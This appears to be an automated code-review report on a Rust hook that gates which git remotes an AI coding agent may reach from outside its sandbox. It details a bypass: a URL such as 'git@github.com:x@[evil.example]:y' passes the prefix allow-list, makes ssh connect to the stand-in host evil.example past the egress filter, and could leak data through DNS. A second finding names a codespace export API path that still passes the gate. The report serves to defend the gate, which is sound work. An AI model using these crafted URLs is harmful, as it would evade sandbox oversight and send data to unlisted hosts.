findings.description: A prefix entry still does not pin the ssh host. git takes the ssh destination from a bracketed `@[host]` anywhere after the prefix, so `git@github.com:x@[evil.example]:y` (scp) or `ssh://git@github.com/x@[evil.example]/y` (URL) passes `url.starts_with(entry)`. The unsandboxed ls-remote then runs `ssh 'git@github.com:x@evil.example'`, which connects to evil.example.
findings.body:
The delta makes a prefix fix the host in two ways: an entry ending in `/`, or an scp-form entry ending in `:`. For the ssh transport, neither way holds.

```rust
url == entry
    || (entry.ends_with('/')
        || entry.ends_with(':') && !entry.contains("://"))
        && url.starts_with(entry)
```

The only checks before this are `!url.contains('\n')` and `!url.contains("::")`. Nothing rejects `[`, `]` or a second `@`, and `on_remote` passes the URL straight to `git ls-remote -- <url>`.

**How git reads the host.** In git's `connect.c`, `parse_connect_url` calls `host_end()` for both forms, scp and `ssh://`. `host_end()` searches the whole rest of the string for `@[`, path included; that search exists for the `user@[::1]:repo` form. A later `@[...]` therefore moves the end of the host:

- **scp form.** Entry `git@github.com:`, URL `git@github.com:x@[evil.example]:y`. The host becomes `git@github.com:x@[evil.example]` and the path is `y`.
- **URL form.** Entry `ssh://git@github.com/`, URL `ssh://git@github.com/x@[evil.example]/y`. The host becomes `git@github.com/x@[evil.example]`.

`get_host_and_port` strips the brackets, so ssh receives `git@github.com:x@evil.example`. OpenSSH splits `user@host` at the last `@` and connects to `evil.example`.

**What reaches the attacker's host.** With no tty, the host-key check usually aborts the session after key exchange. The DNS lookup and the TCP/SSH connection still happen, from outside the sandbox's egress filter, to a host no entry names. A subdomain label can carry data through DNS. The comment at L686-690 and the PR body ("reaches only a URL the new `PUSH_GATE_REMOTES` lists") say this cannot happen.

https prefixes are not affected: curl ends the authority at the first `/`.

**Fix.** Limit what a prefix match may append after the entry so it cannot re-open the host part. For example, refuse a `rest` that contains `@`, `[` or `%`. A stricter option allows only `[A-Za-z0-9._/-]`. Apply it in both forms, and add a test like `probes_no_url_that_only_shares_a_url_prefix_ending_in_a_colon` that uses `git@example.invalid:x@[other.invalid]:un.git`.

https://github.com/AlexisBalayre/claude-code-config/blob/ca5f2aacf80302f2ac84be4268dc87469ddf20e7/tools/hooks-rs/src/push_gate.rs#L686-L702

Confidence is medium because git's `connect.c` and OpenSSH's destination parsing are not in the tree.

findings.description: The README's list of `gh api` paths that ask (`git/refs`, `contents`, `update-branch`, a branch `rename`) omits the `autofix/commits` path this delta adds to the gate (push_gate.rs L144); add it to the list.

The README says a `gh api` call that writes a ref or a file asks, but `gh api -X POST user/codespaces/<name>/exports` still passes, and it pushes a codespace's unpushed changes to a branch or fork. It needs the codespace scope, so reach is small; adding `b"/exports"` to the `ref_path` list next to `b"/autofix/commits"` covers it.
